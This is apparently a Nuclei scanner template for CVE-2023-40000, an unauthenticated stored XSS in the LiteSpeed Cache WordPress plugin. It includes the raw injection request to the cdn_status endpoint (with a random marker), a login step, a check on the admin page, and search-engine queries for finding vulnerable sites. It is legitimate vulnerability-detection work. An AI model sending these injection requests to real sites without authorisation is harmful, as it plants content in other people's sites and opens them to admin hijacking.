flow: http(1) || (http(2) && http(3) && http(4))
http:
- extractors:
  - group: 1
    name: version
    part: body
    regex:
    - 'Stable tag: ([0-9.]+)'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, 'LiteSpeed Cache')
    - compare_versions(version, '<= 5.7.0.1')
    type: dsl
  raw:
  - 'GET /wp-content/plugins/litespeed-cache/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body,'_res','ok')
    - contains(content_type,"application/json")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /wp-json/litespeed/v1/cdn_status HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    success=0&result[_msg]={{marker}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(header, "wordpress_logged_in")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "{{marker}}", "LiteSpeed Cache")
    type: dsl
  raw:
  - 'GET /wp-admin/admin.php?page=litespeed-cdn HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-40000
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:litespeedtech:litespeed_cache:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-40000
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-79
    epss-percentile: 0.99018
    epss-score: 0.79178
  description: 'Improper Neutralization of Input During Web Page Generation (''Cross-site
    Scripting'') vulnerability in LiteSpeed Technologies LiteSpeed Cache allows Stored
    XSS.This issue affects LiteSpeed Cache- from n/a through 5.7.

    '
  impact: 'Unauthenticated attackers can inject stored XSS through the CDN status
    endpoint, allowing them to execute JavaScript in all WordPress admin users'' browsers,
    potentially stealing admin credentials and hijacking WordPress sites using LiteSpeed
    Cache.

    '
  metadata:
    fofa-query: wp-content/plugins/litespeed-cache/
    framework: wordpress
    google-query: inurl:"/wp-content/plugins/litespeed-cache/"
    max-request: 4
    product: litespeed_cache
    shodan-query: vuln:CVE-2023-40000
    vendor: litespeedtech
    verified: true
  name: LiteSpeed Cache <= 5.7 - Unauthenticated Stored XSS
  reference:
  - https://wpscan.com/vulnerability/dd9054cc-1259-427d-a4ad-1875b7b2b3b4
  - https://wordpress.org/plugins/litespeed-cache
  - https://patchstack.com/database/vulnerability/litespeed-cache/wordpress-litespeed-cache-plugin-5-7-unauthenticated-site-wide-stored-xss-vulnerability?_s_id=cve
  remediation: 'Update LiteSpeed Cache plugin to version 5.7.0.1 or later which properly
    sanitizes input in the /wp-json/litespeed/v1/cdn_status endpoint.

    '
  severity: high
  tags: wpscan,cve,cve2023,wordpress,wp-plugin,wp,litespeed-cache,xss,intrusive,vkev,vuln
variables:
  marker: '{{randstr}}'
